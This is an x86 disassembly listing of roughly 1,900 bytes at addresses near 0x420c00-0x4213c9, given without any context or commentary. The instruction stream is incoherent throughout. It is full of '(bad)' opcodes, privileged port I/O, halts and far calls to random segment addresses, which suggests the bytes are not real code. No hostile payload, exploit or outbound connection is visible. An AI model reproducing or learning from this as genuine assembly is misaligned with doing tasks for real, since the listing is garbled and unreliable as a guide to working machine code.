  420c12:	adc    eax,edi
  420c14:	mov    eax,ds:0xb7cc08f0
  420c19:	adc    BYTE PTR [esp+ebx*4],0x1f
  420c1d:	cld    
  420c1e:	jl     0x420c98
  420c20:	bound  ebp,QWORD PTR [ecx+ebp*1]
  420c23:	push   cs
  420c24:	sbb    eax,0x4d5fda78
  420c29:	adc    al,0x5a
  420c2b:	sbb    BYTE PTR [ebp+0x37a04e0],bh
  420c31:	push   ss
  420c32:	les    ebx,FWORD PTR [esi+0x47]
  420c35:	push   esp
  420c36:	sub    bh,BYTE PTR [eax]
  420c38:	imul   eax,DWORD PTR [esi+0x1d],0x7e
  420c3c:	mov    ds:0xb2f0f44f,eax
  420c41:	pop    eax
  420c42:	retf   
  420c43:	push   ss
  420c44:	adc    BYTE PTR [esi+0x7b],cl
  420c47:	ins    BYTE PTR es:[edi],dx
  420c48:	sahf   
  420c49:	xchg   esp,eax
  420c4a:	fild   QWORD PTR [edx]
  420c4c:	xor    bh,BYTE PTR [ecx]
  420c4e:	jbe    0x420c5c
  420c50:	cmc    
  420c51:	(bad)  
  420c52:	mov    edi,0xf891bb48
  420c57:	mov    ?,WORD PTR [ebp+0x8]
  420c5a:	add    BYTE PTR [edx],bl
  420c5c:	fwait
  420c5d:	pop    eax
  420c5e:	(bad)  
  420c5f:	out    0x64,al
  420c61:	jo     0x420c85
  420c63:	mov    al,ds:0xe6f3b155
  420c68:	mov    BYTE PTR [esi],bl
  420c6a:	gs mov bl,0x5b
  420c6d:	xlat   BYTE PTR ds:[ebx]
  420c6e:	jnp    0x420c11
  420c70:	cmp    eax,0x62e0bae8
  420c75:	imul   ecx,DWORD PTR [edi-0x63],0xadc2adde
  420c7c:	xchg   ebx,eax
  420c7d:	xchg   BYTE PTR [edi-0x11be811d],ch
  420c83:	test   DWORD PTR [edi],ebx
  420c85:	mov    esi,DWORD PTR ss:0xbe1762c6
  420c8c:	and    DWORD PTR [edx-0x1f],edi
  420c8f:	or     DWORD PTR [edx+0x505a9ee0],edi
  420c95:	retf   
  420c96:	xor    cl,BYTE PTR [edi-0x1aff1935]
  420c9c:	ficom  DWORD PTR [esi+0x3c618a90]
  420ca2:	mov    ds:0xf4861deb,eax
  420ca7:	sti    
  420ca8:	ja     0x420c49
  420caa:	sbb    eax,0x5e021a3e
  420caf:	out    0x20,al
  420cb1:	jecxz  0x420cf2
  420cb3:	push   ds
  420cb4:	push   0xffffff90
  420cb6:	in     al,dx
  420cb7:	sbb    edx,ecx
  420cb9:	fimul  WORD PTR [edi]
  420cbb:	lods   eax,DWORD PTR ds:[esi]
  420cbc:	pusha  
  420cbd:	fstp   TBYTE PTR [ebx+0x72]
  420cc0:	xor    dh,BYTE PTR [eax+ebp*4]
  420cc3:	(bad)  
  420cc4:	pop    ss
  420cc5:	pop    ebx
  420cc6:	int3   
  420cc7:	mov    al,0x17
  420cc9:	mov    eax,ds:0x2315fecb
  420cce:	jecxz  0x420cdd
  420cd0:	sub    eax,0x50f43901
  420cd5:	xor    BYTE PTR [edi+ebp*4-0x3d],0x8b
  420cda:	jno    0x420c7e
  420cdc:	call   0xfc26:0x3ec3bf58
  420ce3:	xchg   ecx,eax
  420ce4:	push   ebp
  420ce5:	xor    ecx,DWORD PTR [ecx]
  420ce7:	popa   
  420ce8:	inc    eax
  420ce9:	imul   esp,DWORD PTR [edx-0x6500edd0],0xffffff8a
  420cf0:	js     0x420cbf
  420cf2:	in     al,dx
  420cf3:	neg    esp
  420cf5:	jecxz  0x420c99
  420cf7:	lds    edi,FWORD PTR [edi]
  420cf9:	mov    al,0x6b
  420cfb:	push   edi
  420cfc:	xchg   edx,eax
  420cfd:	pop    eax
  420cfe:	test   al,0x8b
  420d00:	jl     0x420d50
  420d02:	lea    ecx,[ebx-0x36]
  420d05:	xor    ebp,DWORD PTR [ebx+0x8]
  420d08:	call   0x6dbb:0xc8835cfb
  420d0f:	and    al,0xa7
  420d11:	les    esp,FWORD PTR [ebx+0x5f104162]
  420d17:	je     0x420d3c
  420d19:	ret    0x4de4
  420d1c:	lock dec edx
  420d1e:	add    eax,0xa91b17c2
  420d23:	jo     0x420d67
  420d25:	adc    eax,0x96afc9f2
  420d2a:	jecxz  0x420d1e
  420d2c:	push   ebp
  420d2d:	push   0x541f4846
  420d32:	call   0x66ed:0x9af1295c
  420d39:	adc    ah,BYTE PTR [esp+ebp*1+0x81ff9f0]
  420d40:	xor    DWORD PTR [esi+0x45],0x8e94eaa3
  420d47:	nop
  420d48:	adc    ch,bh
  420d4a:	in     eax,0xdc
  420d4c:	stos   DWORD PTR es:[edi],eax
  420d4d:	fdivr  QWORD PTR [eax]
  420d4f:	in     al,0x14
  420d51:	pusha  
  420d52:	xchg   dh,cl
  420d54:	pop    esp
  420d55:	cmp    eax,0x631c600f
  420d5a:	push   esp
  420d5b:	nop
  420d5c:	pop    ss
  420d5d:	les    edx,FWORD PTR [esp+eiz*4-0x1b2ef44b]
  420d64:	pop    es
  420d65:	jo     0x420da7
  420d67:	sub    esp,DWORD PTR [eax-0x4a]
  420d6a:	ja     0x420d26
  420d6c:	out    dx,al
  420d6d:	div    DWORD PTR [ebx+0xa5201d0]
  420d73:	push   0xda623f54
  420d78:	sbb    esp,DWORD PTR [ecx]
  420d7a:	push   ebp
  420d7b:	or     DWORD PTR [eax],0xa52dd4a6
  420d81:	pop    ss
  420d82:	repz std 
  420d84:	mov    ss,WORD PTR [ecx-0x1e]
  420d87:	std    
  420d88:	fwait
  420d89:	imul   ebx,DWORD PTR [edx],0xffffff86
  420d8c:	outs   dx,DWORD PTR ds:[esi]
  420d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d8e:	iret   
  420d8f:	dec    esi
  420d90:	jp     0x420dd5
  420d92:	enter  0x3e0c,0x60
  420d96:	dec    BYTE PTR [eax]
  420d98:	push   ebp
  420d99:	iret   
  420d9a:	sbb    DWORD PTR [ecx],ebx
  420d9c:	aam    0x60
  420d9e:	popf   
  420d9f:	fsincos 
  420da1:	cld    
  420da2:	in     eax,dx
  420da3:	adc    al,0x7c
  420da5:	xor    edi,esi
  420da7:	sbb    BYTE PTR [ebp-0x7b],cl
  420daa:	add    eax,0xc8ab438d
  420daf:	fimul  DWORD PTR [ebx]
  420db1:	call   0xf4308cdf
  420db6:	fld    DWORD PTR [edi+0x42]
  420db9:	jae    0x420d9d
  420dbb:	inc    eax
  420dbc:	dec    ecx
  420dbd:	and    DWORD PTR [ebp-0x3e],ebp
  420dc0:	fsubr  st(2),st
  420dc2:	sbb    BYTE PTR [edx-0x14],ah
  420dc5:	shl    BYTE PTR [ecx+0x76],0x3d
  420dc9:	mov    DWORD PTR [eax],ebp
  420dcb:	(bad)  
  420dcc:	int    0x1b
  420dce:	call   0x16c3:0x1fe995e8
  420dd5:	jp     0x420daa
  420dd7:	mov    WORD PTR [ebp+0x58],ds
  420dda:	jg     0x420d8a
  420ddc:	or     BYTE PTR [edi+eax*1+0x11cb169d],dh
  420de3:	push   esp
  420de4:	or     ebx,DWORD PTR [eax]
  420de6:	(bad)  
  420de8:	sub    bh,BYTE PTR [edi-0x26a108a0]
  420dee:	jmp    0x420e25
  420df0:	ja     0x420e35
  420df2:	in     eax,dx
  420df3:	ret    
  420df4:	stc    
  420df5:	ss (bad) 
  420df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420df8:	cdq    
  420df9:	add    cl,BYTE PTR [esi-0x324a5260]
  420dff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e00:	repz lds eax,FWORD PTR [ebx]
  420e03:	gs adc edi,esp
  420e06:	fwait
  420e07:	cli    
  420e08:	or     edx,esi
  420e0a:	out    0xf3,eax
  420e0c:	ja     0x420e0a
  420e0e:	cld    
  420e0f:	push   esp
  420e10:	cmp    DWORD PTR cs:[ecx*1+0x482beab4],esi
  420e18:	jnp    0x420e60
  420e1a:	jecxz  0x420e39
  420e1c:	clc    
  420e1d:	xchg   edx,eax
  420e1e:	out    0x81,eax
  420e20:	lods   al,BYTE PTR ds:[esi]
  420e21:	inc    edx
  420e22:	std    
  420e23:	imul   ebx,eax,0xfffffffd
  420e26:	ds dec edx
  420e28:	cld    
  420e29:	jge    0x420e8b
  420e2b:	cmp    edi,DWORD PTR [ebp+0x3b]
  420e2e:	dec    edx
  420e2f:	popa   
  420e30:	xchg   BYTE PTR [esi],bh
  420e32:	push   es
  420e33:	push   esp
  420e34:	(bad)  
  420e35:	(bad)  
  420e36:	mov    eax,0xabbcbf83
  420e3b:	hlt    
  420e3c:	imul   edx,ebx,0xffffffe7
  420e3f:	xor    eax,ecx
  420e41:	xor    al,0x41
  420e43:	jne    0x420e18
  420e45:	shr    DWORD PTR [ebx],1
  420e47:	mov    edi,0xf933c4f1
  420e4c:	lea    eax,[edx+0x0]
  420e4f:	nop
  420e50:	dec    ecx
  420e51:	inc    edi
  420e52:	leave  
  420e53:	(bad)  
  420e54:	jb     0x420de0
  420e56:	arpl   WORD PTR ds:0xfdeb8352,si
  420e5c:	or     eax,0x91d512b5
  420e61:	das    
  420e62:	sbb    BYTE PTR ds:0x91e84294,0xc2
  420e69:	or     ebx,DWORD PTR [eax+ebp*1-0x3cf8beb8]
  420e70:	cmp    al,0x93
  420e72:	mov    WORD PTR ds:0xf78928bd,cs
  420e78:	les    ebx,FWORD PTR [esi-0x1ef0e2f2]
  420e7e:	lahf   
  420e7f:	dec    esi
  420e80:	sete   BYTE PTR [ebx]
  420e83:	dec    edx
  420e84:	ret    
  420e85:	js     0x420e81
  420e87:	jae    0x420ee0
  420e89:	es xchg esi,eax
  420e8b:	mov    esi,0xac559ddb
  420e90:	jecxz  0x420e1d
  420e92:	lods   al,BYTE PTR ds:[esi]
  420e93:	pop    ebp
  420e94:	xor    bl,BYTE PTR [ecx]
  420e96:	(bad)  
  420e97:	cdq    
  420e98:	push   0xeb780e75
  420e9d:	and    eax,0x55061a61
  420ea2:	lock loop 0x420e35
  420ea5:	jge    0x420e6e
  420ea7:	shl    DWORD PTR [ecx+0x34],0xe0
  420eab:	retf   
  420eac:	aaa    
  420ead:	or     al,0xd1
  420eaf:	ins    DWORD PTR es:[edi],dx
  420eb0:	sbb    DWORD PTR [edx+0x20],esp
  420eb3:	xor    ebp,ecx
  420eb5:	sub    DWORD PTR [esi],esi
  420eb7:	jno    0x420e94
  420eb9:	(bad)  
  420eba:	(bad)  
  420ebb:	xchg   BYTE PTR [eax-0x1f],bh
  420ebe:	bnd jno 0x420f39
  420ec1:	add    eax,0x973ef4b0
  420ec6:	jo     0x420f47
  420ec8:	aam    0xd9
  420eca:	pop    esi
  420ecb:	(bad)  
  420ecc:	mov    al,0xfc
  420ece:	or     al,0x3e
  420ed0:	jbe    0x420e71
  420ed2:	int3   
  420ed3:	mov    ss,WORD PTR [edx-0x23c92c9e]
  420ed9:	pop    esp
  420eda:	push   0x1070b21e
  420edf:	or     al,0x7a
  420ee1:	cmp    al,0x9c
  420ee3:	cdq    
  420ee4:	push   eax
  420ee5:	and    BYTE PTR [ebx-0x2c68c7b7],dl
  420eeb:	into   
  420eec:	add    esi,DWORD PTR [ebp+0x2d64bd4a]
  420ef2:	push   0xb2556b23
  420ef7:	push   ebp
  420ef8:	jno    0x420eb3
  420efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420efb:	xor    ebx,DWORD PTR [edi+0x3083820]
  420f01:	dec    ecx
  420f02:	add    BYTE PTR [ebp+0x533fc89],dh
  420f08:	repz and eax,0x901f612b
  420f0e:	dec    esp
  420f0f:	ror    DWORD PTR [edx+0x18],1
  420f12:	mov    dh,0x48
  420f14:	and    BYTE PTR ds:0x6f88e7f1,dl
  420f1a:	ins    BYTE PTR es:[edi],dx
  420f1b:	popa   
  420f1c:	inc    ecx
  420f1d:	inc    ebx
  420f1e:	xchg   esp,eax
  420f1f:	or     cl,BYTE PTR [bx+si]
  420f22:	stc    
  420f23:	jge    0x420f46
  420f25:	push   ecx
  420f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f27:	jp     0x420f79
  420f29:	mov    eax,0x1dc6a403
  420f2e:	xor    dl,BYTE PTR [esi-0x45748f31]
  420f34:	jecxz  0x420f1d
  420f36:	mov    BYTE PTR [ecx+0x38],cl
  420f39:	(bad)  
  420f3b:	jb     0x420f4d
  420f3d:	xchg   esp,eax
  420f3e:	add    BYTE PTR [eax-0x50],dh
  420f41:	and    al,0x34
  420f43:	stc    
  420f44:	and    eax,0x99f8868c
  420f49:	sbb    al,0x22
  420f4b:	mov    dl,0xc4
  420f4d:	pop    esi
  420f4e:	js     0x4dbb0aec
  420f54:	mov    al,0x8b
  420f56:	mov    dh,0x5b
  420f58:	jnp    0x420f19
  420f5a:	pop    ds
  420f5b:	sub    eax,DWORD PTR [eax]
  420f5d:	mov    dl,0x91
  420f5f:	xlat   BYTE PTR ds:[ebx]
  420f60:	cld    
  420f61:	scas   al,BYTE PTR es:[edi]
  420f62:	fst    QWORD PTR ds:[ebx+0x5b8a2455]
  420f69:	in     al,0x31
  420f6b:	test   eax,0x6a4d88b8
  420f70:	push   esi
  420f71:	pop    ebp
  420f72:	mov    ds:0x8608b039,al
  420f77:	sbb    DWORD PTR [edx-0x79],edi
  420f7a:	call   ebx
  420f7c:	and    BYTE PTR [ebx],bl
  420f7e:	in     al,dx
  420f7f:	jl     0x420f3f
  420f81:	sub    esp,DWORD PTR ds:0xecc98538
  420f87:	jb     0x420fe4
  420f89:	fcom   DWORD PTR [ecx]
  420f8b:	retf   
  420f8c:	sub    eax,0x1ae90cf1
  420f91:	add    DWORD PTR [eax],0xffffffc2
  420f94:	pop    ds
  420f95:	mov    bh,0xe
  420f97:	dec    edx
  420f98:	rcr    DWORD PTR [esi+ebp*2-0x5395bd58],cl
  420f9f:	sysexit 
  420fa1:	imul   edx,DWORD PTR [ecx+0x6cf6c5cf],0xffffff81
  420fa8:	xchg   BYTE PTR [edi],ah
  420faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fab:	sahf   
  420fac:	cli    
  420fad:	pop    es
  420fae:	push   esp
  420faf:	ret    0x9f58
  420fb2:	cwde   
  420fb3:	inc    edi
  420fb4:	mov    ss,WORD PTR [ecx-0x1]
  420fb7:	jae    0x420f6c
  420fb9:	pop    esp
  420fba:	xchg   ecx,eax
  420fbb:	shrd   edi,ebp,0x75
  420fbf:	adc    cl,BYTE PTR [esi+0x58f5645b]
  420fc5:	mov    ebx,DWORD PTR [eax-0x69]
  420fc8:	push   esi
  420fc9:	jbe    0x420fdb
  420fcb:	or     edx,DWORD PTR [ebp+0x42]
  420fce:	mov    esp,?
  420fd0:	and    bh,BYTE PTR [esi+edi*8]
  420fd3:	pop    edx
  420fd4:	jmp    DWORD PTR [ebx]
  420fd6:	fisub  DWORD PTR [ecx]
  420fd8:	cmc    
  420fd9:	loop   0x42103d
  420fdb:	jb     0x420f96
  420fdd:	and    eax,0x206ba235
  420fe2:	aad    0xad
  420fe4:	xor    DWORD PTR [ebx+esi*2+0x25c51b74],ebx
  420feb:	aam    0x66
  420fed:	sub    ch,dl
  420fef:	push   ebx
  420ff0:	mov    ebp,0xfed38d98
  420ff5:	add    edi,ebp
  420ff7:	ins    DWORD PTR es:[edi],dx
  420ff8:	dec    ebp
  420ff9:	les    ebx,FWORD PTR [edx]
  420ffb:	out    0xfb,al
  420ffd:	pop    eax
  420ffe:	cmp    eax,0x4474e4ea
  421003:	out    0x3b,al
  421005:	pop    ecx
  421006:	in     al,dx
  421007:	xchg   ebx,eax
  421008:	xor    bh,BYTE PTR [edi+esi*4]
  42100b:	int3   
  42100c:	push   ebx
  42100d:	mov    eax,ds:0xa1f70a00
  421012:	addr16 pop eax
  421014:	int    0x3c
  421016:	cdq    
  421017:	and    eax,0xed0b34f7
  42101c:	cmp    al,0xe0
  42101e:	addr16 cmp al,0x22
  421021:	rcr    BYTE PTR [esi+0x8],1
  421024:	add    al,0x85
  421026:	dec    ecx
  421027:	mov    ch,0xc4
  421029:	dec    ebp
  42102a:	add    eax,0xf264c693
  42102f:	test   DWORD PTR [edx],0x9d959e33
  421035:	outs   dx,BYTE PTR ds:[esi]
  421036:	cmp    al,0x2f
  421038:	dec    esp
  421039:	pop    es
  42103a:	rol    ebx,0xf
  42103d:	mov    cl,0xbb
  42103f:	les    esi,FWORD PTR [edi-0xe]
  421042:	sbb    al,0x8f
  421044:	or     eax,DWORD PTR [esp+edx*8+0x1a]
  421048:	ins    BYTE PTR es:[edi],dx
  421049:	neg    BYTE PTR [eax-0x76]
  42104c:	mov    ds:0xdb26e3fd,eax
  421051:	pop    ebp
  421052:	jo     0x421097
  421054:	js     0x421046
  421056:	bound  edi,QWORD PTR [ecx+0x6840c30]
  42105c:	pop    ebx
  42105d:	dec    esi
  42105e:	cmp    ah,BYTE PTR [ebx+0x55]
  421061:	(bad)  
  421062:	pop    es
  421063:	add    BYTE PTR [edx],dl
  421065:	das    
  421066:	sbb    bh,BYTE PTR [esi+edx*8-0x3e]
  42106a:	xor    esp,0x30a77229
  421070:	dec    ebp
  421071:	dec    eax
  421072:	leave  
  421073:	pushf  
  421074:	(bad)  
  421075:	adc    eax,0x6ed95ae2
  42107a:	inc    esp
  42107b:	adc    eax,0x28ff7d73
  421080:	hlt    
  421081:	pusha  
  421082:	icebp  
  421083:	fisub  DWORD PTR [esi]
  421085:	repz sub eax,0x98f30964
  42108b:	and    edi,edi
  42108d:	cmp    ebp,DWORD PTR [esi-0x7a]
  421090:	lea    ebx,ds:0x2c8c1547
  421096:	pop    eax
  421097:	push   esp
  421098:	ret    
  421099:	retf   0x48a3
  42109c:	mov    ah,0x2
  42109e:	sbb    BYTE PTR [edi*8-0x5086b0f4],ch
  4210a5:	jbe    0x4210e4
  4210a7:	cmp    eax,0x6039385d
  4210ac:	xchg   ecx,eax
  4210ad:	jmp    0x83413ce9
  4210b2:	enter  0x5c8,0x9f
  4210b6:	sub    edx,DWORD PTR [edx+ebx*4]
  4210b9:	pop    ebp
  4210ba:	pop    ebp
  4210bb:	mov    ds:0x31dc750c,eax
  4210c0:	repz push eax
  4210c2:	std    
  4210c3:	pop    eax
  4210c4:	inc    ecx
  4210c5:	cmp    eax,0x79e726f9
  4210ca:	jl     0x4210f3
  4210cc:	loopne 0x421111
  4210ce:	out    dx,al
  4210cf:	call   0x473abbe
  4210d4:	shl    DWORD PTR [esi],cl
  4210d6:	ret    0x8daf
  4210d9:	clc    
  4210da:	push   ebp
  4210db:	test   eax,0x945f0718
  4210e0:	out    0xe0,al
  4210e2:	pusha  
  4210e3:	or     dl,BYTE PTR [eax+0x44]
  4210e6:	inc    ebx
  4210e7:	stos   DWORD PTR es:[edi],eax
  4210e8:	or     ecx,ebx
  4210ea:	xchg   ecx,eax
  4210eb:	cld    
  4210ec:	repnz aam 0x3e
  4210ef:	outs   dx,BYTE PTR ds:[esi]
  4210f0:	mov    eax,DWORD PTR [edi+esi*4-0x2a6cf7e2]
  4210f7:	inc    ebp
  4210f8:	and    eax,0x3968ccc7
  4210fd:	mov    ds:0xd3beeb88,eax
  421102:	pushf  
  421103:	loop   0x421174
  421105:	stc    
  421106:	mov    cs,WORD PTR [ecx]
  421108:	push   es
  421109:	push   esi
  42110a:	jge    0x42109b
  42110c:	sahf   
  42110d:	inc    ebx
  42110e:	ds cmp edx,edi
  421111:	jb     0x421179
  421113:	das    
  421114:	ja     0x4210bf
  421116:	mov    edi,eax
  421118:	es mov ebx,0x891f9cc
  42111e:	and    ebx,ebp
  421120:	jne    0x421176
  421122:	lods   al,BYTE PTR ds:[esi]
  421123:	xchg   ecx,eax
  421124:	aad    0x12
  421126:	fs mov bh,0x60
  421129:	dec    ecx
  42112a:	cmp    eax,0xb92bfa62
  42112f:	xor    ch,cl
  421131:	ins    BYTE PTR es:[edi],dx
  421132:	in     al,dx
  421133:	icebp  
  421134:	enter  0x3458,0xbf
  421138:	mov    al,0xc0
  42113a:	and    ebp,ebp
  42113c:	or     BYTE PTR [edx+edx*1-0x448b2646],ah
  421143:	or     eax,DWORD PTR [ecx+0x7312a123]
  421149:	aas    
  42114a:	add    BYTE PTR [esi+0x567ae843],cl
  421150:	sub    ebx,DWORD PTR [esi+0x60e4c48]
  421156:	dec    ebx
  421157:	add    BYTE PTR [edi-0x15],0x77
  42115b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42115c:	loop   0x4211b4
  42115e:	inc    ecx
  42115f:	les    edx,FWORD PTR [esi-0x30]
  421162:	sti    
  421163:	sbb    ah,BYTE PTR [ecx-0x5f]
  421166:	daa    
  421167:	pop    es
  421168:	inc    esi
  421169:	bound  edx,QWORD PTR [ebx-0x38]
  42116c:	jae    0x42116b
  42116e:	vmaxsd xmm7,xmm0,QWORD PTR [edi+eax*1]
  421173:	stos   DWORD PTR es:[edi],eax
  421174:	fs dec esp
  421176:	jae    0x4211d3
  421178:	pushf  
  421179:	leave  
  42117a:	je     0x4211ec
  42117c:	test   DWORD PTR [esi+eax*4+0x2],edx
  421180:	iret   
  421181:	push   ecx
  421182:	fld    DWORD PTR [eax]
  421184:	push   eax
  421185:	mov    al,ds:0x4011ed96
  42118a:	pop    esi
  42118b:	cmp    al,0xc7
  42118d:	cmp    esi,DWORD PTR [ecx+0x52]
  421190:	xor    eax,DWORD PTR [ecx+0x50]
  421193:	mov    ebx,DWORD PTR [ecx+0x5e]
  421196:	enter  0x2d77,0xcb
  42119a:	sti    
  42119b:	jmp    0xf465:0xb84c000b
  4211a2:	jp     0x42118e
  4211a4:	jmp    0x4222:0x2df6ad2
  4211ab:	les    esi,FWORD PTR [ebx]
  4211ad:	stos   DWORD PTR es:[edi],eax
  4211ae:	(bad)  
  4211af:	cmp    bl,BYTE PTR [ebx]
  4211b1:	out    0x21,al
  4211b3:	mov    bl,0x3b
  4211b5:	jmp    0x42121f
  4211b7:	inc    ebp
  4211b8:	mov    edi,0x5391eb73
  4211bd:	add    eax,0x60984ef1
  4211c2:	ja     0x421148
  4211c4:	pop    esp
  4211c5:	cmp    cl,bh
  4211c7:	xor    dh,BYTE PTR [edx-0x2b186006]
  4211cd:	pop    ebx
  4211ce:	outs   dx,DWORD PTR ds:[esi]
  4211cf:	mov    ch,0xbe
  4211d1:	mov    ecx,0x702973ca
  4211d6:	ficom  DWORD PTR [eax+0x66]
  4211d9:	retf   
  4211da:	add    edx,DWORD PTR [ebp+0x79]
  4211dd:	(bad)  
  4211de:	push   esi
  4211df:	mov    ?,WORD PTR [esi-0x24]
  4211e2:	mov    dh,0x44
  4211e4:	or     dh,BYTE PTR ds:0xd2b4d5d9
  4211ea:	cmp    BYTE PTR [ecx-0x20],bh
  4211ed:	adc    al,0x3e
  4211ef:	mov    ecx,0xedec23e1
  4211f4:	cdq    
  4211f5:	inc    eax
  4211f6:	stc    
  4211f7:	sbb    al,0x8f
  4211f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211fa:	lods   eax,DWORD PTR ds:[esi]
  4211fb:	or     al,0xc7
  4211fd:	cmp    al,0x17
  4211ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421200:	or     eax,0x280d7e94
  421205:	jp     0x421248
  421207:	pop    ds
  421208:	mov    ebx,ebx
  42120a:	mov    esp,0x41d8f35c
  42120f:	cvtpi2ps xmm0,QWORD PTR [edi+0x5b]
  421213:	and    edi,esp
  421215:	sub    al,0x7f
  421217:	xor    DWORD PTR [edi-0x5e],esi
  42121a:	gs mov eax,0xe56b231
  421220:	pop    eax
  421221:	and    DWORD PTR ds:0xcffe4557,esp
  421227:	mov    bl,0xae
  421229:	mov    cl,0x9d
  42122b:	je     0x42128f
  42122d:	and    bh,ch
  42122f:	mov    eax,eax
  421231:	push   es
  421232:	push   es
  421233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421234:	add    dl,BYTE PTR es:[edx-0x4b84d082]
  42123b:	inc    eax
  42123c:	and    edi,DWORD PTR [ebp+0x36f77b62]
  421242:	cld    
  421243:	out    0x41,al
  421245:	ins    BYTE PTR es:[edi],dx
  421246:	in     eax,0xd6
  421248:	cld    
  421249:	pop    ebx
  42124a:	hlt    
  42124b:	xor    eax,0xe35b8558
  421250:	stos   DWORD PTR es:[edi],eax
  421251:	mov    ds:0x35e43f9,eax
  421256:	or     esp,DWORD PTR fs:[eax+0x3e]
  42125a:	xchg   edi,eax
  42125b:	loope  0x4212cb
  42125d:	(bad)  
  42125f:	ret    
  421260:	mov    esp,0xf92f97b8
  421265:	cmp    bh,BYTE PTR [esi+0x60]
  421268:	dec    ebx
  421269:	out    dx,eax
  42126a:	xlat   BYTE PTR ds:[ebx]
  42126b:	mov    dl,0x63
  42126d:	push   ecx
  42126e:	xor    eax,esp
  421270:	or     al,BYTE PTR [eax-0x7460bfc3]
  421276:	pusha  
  421277:	mov    ah,0xc4
  421279:	ins    DWORD PTR es:[edi],dx
  42127a:	in     eax,0xb7
  42127c:	popf   
  42127d:	push   cs
  42127e:	pop    es
  42127f:	fstp   QWORD PTR [ecx+0x70d01533]
  421285:	jp     0x4212f9
  421287:	push   ecx
  421288:	sbb    dl,BYTE PTR [ebx+0x4e]
  42128b:	jns    0x421215
  42128d:	cdq    
  42128e:	sub    BYTE PTR [eax-0x3f],0x37
  421292:	xor    al,0x1
  421294:	add    DWORD PTR ds:0x54c792bb,esp
  42129a:	dec    edi
  42129b:	push   ecx
  42129c:	xchg   eax,ebx
  42129e:	dec    ebp
  42129f:	sbb    dh,BYTE PTR ds:0xffe04707
  4212a5:	push   ecx
  4212a6:	xor    dl,bh
  4212a8:	ins    DWORD PTR es:[edi],dx
  4212a9:	sub    BYTE PTR [eax+esi*1+0x125d8d1f],dh
  4212b0:	icebp  
  4212b1:	pop    ebp
  4212b2:	jnp    0x4212a5
  4212b4:	xchg   edx,eax
  4212b5:	aaa    
  4212b6:	ja     0x42125c
  4212b8:	iret   
  4212b9:	push   ecx
  4212ba:	shl    BYTE PTR [ebx-0x31c0b425],cl
  4212c0:	(bad)  
  4212c1:	fcom   QWORD PTR ds:0x9d0a6b24
  4212c7:	fcomp  QWORD PTR [ebp+0x4d]
  4212ca:	cs dec edi
  4212cc:	std    
  4212cd:	push   ecx
  4212ce:	ja     0x4212eb
  4212d0:	popa   
  4212d1:	jns    0x421322
  4212d3:	das    
  4212d4:	add    ecx,DWORD PTR ds:0x1551df15
  4212da:	adc    DWORD PTR [eax-0x3e35ea08],edx
  4212e0:	sub    eax,0xc332c004
  4212e5:	sar    ch,0xec
  4212e8:	ja     0x421308
  4212ea:	or     BYTE PTR [edi+0x7],dh
  4212ed:	or     dh,BYTE PTR [eax+edx*1-0x64fac8ac]
  4212f4:	test   DWORD PTR ds:0x5f791b38,eax
  4212fa:	repnz mov al,ds:0xcf40b156
  421300:	mov    bh,0x40
  421302:	lea    esp,[eax]
  421304:	inc    edx
  421305:	ret    0x1d41
  421308:	add    al,0x7d
  42130a:	popa   
  42130b:	mov    dh,bl
  42130d:	gs ja  0x42136b
  421310:	scas   eax,DWORD PTR es:[edi]
  421311:	dec    ebp
  421312:	pop    ss
  421313:	retf   
  421314:	push   eax
  421315:	daa    
  421316:	das    
  421317:	push   ss
  421318:	jns    0x421310
  42131a:	aam    0x54
  42131c:	jg     0x421351
  42131e:	add    BYTE PTR [ecx],bl
  421320:	shr    DWORD PTR [eax+0x24],cl
  421323:	inc    ebx
  421324:	je     0x421369
  421326:	lods   eax,DWORD PTR ds:[esi]
  421327:	or     ebx,DWORD PTR [bp+si+0x70]
  42132b:	iret   
  42132c:	add    eax,DWORD PTR [edi+0x1a]
  42132f:	(bad)  
  421330:	sti    
  421331:	(bad)  
  421332:	int3   
  421333:	jnp    0x421344
  421335:	sbb    esp,DWORD PTR [ebx-0x3c]
  421338:	rol    BYTE PTR [ebx+ebp*4-0x3a],0x46
  42133d:	sub    DWORD PTR [ebp+0x4a],ebx
  421340:	popa   
  421341:	pop    es
  421342:	inc    esp
  421343:	out    0x9f,eax
  421345:	div    BYTE PTR [ecx]
  421347:	stos   BYTE PTR es:[edi],al
  421348:	ins    BYTE PTR es:[edi],dx
  421349:	mov    BYTE PTR [edx-0x186f2dcb],bh
  42134f:	xor    ebp,DWORD PTR [edi-0x23efcdbe]
  421355:	inc    esi
  421356:	fcmovnu st,st(7)
  421358:	call   0xda4078f9
  42135d:	hlt    
  42135e:	out    0x8a,eax
  421360:	jb     0x4212e9
  421362:	mov    esi,0x5146a22
  421367:	shr    DWORD PTR ds:0x77cf321e,0xd1
  42136e:	jo     0x421302
  421370:	js     0x4212fd
  421372:	adc    al,0x61
  421374:	jmp    0x308ac46e
  421379:	inc    ecx
  42137a:	addr16 jmp 0xb7ecc176
  421380:	jbe    0x4213b5
  421382:	lds    ebx,FWORD PTR [eax]
  421384:	jns    0x42137e
  421386:	and    DWORD PTR [esp+ebx*8-0x16c92842],edx
  42138d:	jno    0x42137f
  42138f:	jecxz  0x4213fd
  421391:	or     ecx,DWORD PTR [edx]
  421393:	or     BYTE PTR [edx-0x425a755a],al
  421399:	stos   BYTE PTR es:[edi],al
  42139a:	jmp    0x4213b8
  42139c:	or     BYTE PTR [eax+ebx*2],dh
  42139f:	mov    edi,0x1d538180
  4213a4:	sahf   
  4213a5:	dec    ecx
  4213a6:	or     bh,BYTE PTR [edi+0x6787ca17]
  4213ac:	push   ebx
  4213ad:	repz ds pop es
  4213b0:	addr16 data16 cld 
  4213b3:	push   ss
  4213b4:	adc    esi,0xfffffff6
  4213b7:	mov    edi,0xa3eb5c78
  4213bc:	pop    esi
  4213bd:	mov    ds:0x4328dddc,eax
  4213c2:	mov    eax,0x361552fc
  4213c7:	jge    0x421395
  4213c9:	sbb    eax,0x1757ae52
